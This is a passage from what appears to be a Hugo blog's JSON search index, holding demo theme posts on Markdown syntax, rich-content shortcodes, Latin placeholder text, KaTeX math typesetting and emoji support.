Document\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;p\u0026gt;Test\u0026lt;/p\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; Code block with Hugo\u0026rsquo;s internal highlight shortcode\r1 2 3 4 5 6 7 8 9 10 \u0026lt;!doctype html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt; \u0026lt;title\u0026gt;Example HTML5 Document\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;p\u0026gt;Test\u0026lt;/p\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; List Types\rOrdered List\rFirst item Second item Third item Unordered List\rList item Another item And another item Nested list\rFruit Apple Orange Banana Dairy Milk Cheese Other Elements — abbr, sub, sup, kbd, mark\rGIF is a bitmap image format.\nH2O\nXn + Yn = Zn\nPress CTRL+ALT+Delete to end the session.\nMost salamanders are nocturnal, and hunt for insects, worms, and other small creatures.\nThe above quote is excerpted from Rob Pike\u0026rsquo;s talk during Gopherfest, November 18, 2015.\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n","date":"2019-03-11T00:00:00Z","image":"https://weltolk.github.io/p/markdown-syntax-guide/pawel-czerwinski-8uZPynIu-rQ-unsplash_hud7e36f7e20e71be184458283bdae4646_55974_120x120_fill_q75_box_smart1.jpg","permalink":"https://weltolk.github.io/p/markdown-syntax-guide/","title":"Markdown Syntax Guide"},{"content":"Hugo ships with several Built-in Shortcodes for rich content, along with a Privacy Config and a set of Simple Shortcodes that enable static and no-JS versions of various social media embeds.\nYouTube Privacy Enhanced Shortcode\rTwitter Simple Shortcode\rVimeo Simple Shortcode\r","date":"2019-03-10T00:00:00Z","permalink":"https://weltolk.github.io/p/rich-content/","title":"Rich Content"},{"content":"Lorem est tota propiore conpellat pectoribus de pectora summo.\nRedit teque digerit hominumque toris verebor lumina non cervice subde tollit usus habet Arctonque, furores quas nec ferunt. Quoque montibus nunc caluere tempus inhospita parcite confusaque translucet patri vestro qui optatis lumine cognoscere flos nubis! Fronde ipsamque patulos Dryopen deorum.\nExierant elisi ambit vivere dedere Duce pollice Eris modo Spargitque ferrea quos palude Rursus nulli murmur; hastile inridet ut ab gravi sententia! Nomine potitus silentia flumen, sustinet placuit petis in dilapsa erat sunt. Atria tractus malis.\nComas hunc haec pietate fetum procerum dixit Post torum vates letum Tiresia Flumen querellas Arcanaque montibus omnes Quidem et Vagus elidunt\rThe Van de Graaf Canon\nMane refeci capiebant unda mulcebat\rVicta caducifer, malo vulnere contra dicere aurato, ludit regale, voca! Retorsit colit est profanae esse virescere furit nec; iaculi matertera et visa est, viribus. Divesque creatis, tecta novat collumque vulnus est, parvas. Faces illo pepulere tempus adest. Tendit flamma, ab opes virum sustinet, sidus sequendo urbis.\nIubar proles corpore raptos vero auctor imperium; sed et huic: manus caeli Lelegas tu lux. Verbis obstitit intus oblectamina fixis linguisque ausus sperare Echionides cornuaque tenent clausit possit. Omnia putatur. Praeteritae refert ausus; ferebant e primus lora nutat, vici quae mea ipse. Et iter nil spectatae vulnus haerentia iuste et exercebat, sui et.\nEurytus Hector, materna ipsumque ut Politen, nec, nate, ignari, vernum cohaesit sequitur. Vel mitis temploque vocatus, inque alis, oculos nomen non silvis corpore coniunx ne displicet illa. Crescunt non unus, vidit visa quantum inmiti flumina mortis facto sic: undique a alios vincula sunt iactata abdita! Suspenderat ego fuit tendit: luna, ante urbem Propoetides parte.\n","date":"2019-03-09T00:00:00Z","image":"https://weltolk.github.io/p/placeholder-text/matt-le-SJSpo9hQf7s-unsplash_hu958d513eeefe5556a31d065479ecc5ac_14205_120x120_fill_q75_box_smart1.jpg","permalink":"https://weltolk.github.io/p/placeholder-text/","title":"Placeholder Text"},{"content":"Mathematical notation in a Hugo project can be enabled by using third party JavaScript libraries.\nIn this example we will be using KaTeX\nCreate a partial under /layouts/partials/math.html Within this partial reference the Auto-render Extension or host these scripts locally. Include the partial in your templates like so: 1 2 3 {{ if or .Params.math .Site.Params.math }} {{ partial \u0026#34;math.html\u0026#34; . }} {{ end }} To enable KaTex globally set the parameter math to true in a project\u0026rsquo;s configuration To enable KaTex on a per page basis include the parameter math: true in content files Note: Use the online reference of Supported TeX Functions\nExamples\rBlock math: $$ \\varphi = 1+\\frac{1} {1+\\frac{1} {1+\\frac{1} {1+\\cdots} } } $$\n","date":"2019-03-08T00:00:00Z","permalink":"https://weltolk.github.io/p/math-typesetting/","title":"Math Typesetting"},{"content":"Emoji can be enabled in a Hugo project in a number of ways.\nThe emojify function can be called directly in templates or Inline Shortcodes.\nTo enable emoji globally, set enableEmoji to true in your site\u0026rsquo;s configuration and then you can type emoji shorthand codes directly in content files; e.g.\nThe Emoji cheat sheet is a useful reference for emoji shorthand codes.\nN.B. The above steps enable Unicode Standard emoji characters and sequences in Hugo, however the rendering of these glyphs depends on the browser and the platform. To style the emoji you can either use a third party emoji font or a font stack; e.g.\n1 2 3 .emoji { font-family: Apple Color Emoji, Segoe UI Emoji, NotoColorEmoji, Segoe UI Symbol, Android Emoji, EmojiSymbols; } ","date":"2019-03-05T00:00:00Z","image":"https://weltolk.github.io/p/emoji-support/the-creative-exchange-d2zvqp3fpro-unsplash_huf941de4769045cdfa8c9ee7036519a2a_35369_120x120_fill_q75_box_smart1.jpg","permalink":"https://weltolk.github.io/p/emoji-support/","title":"Emoji Support"}]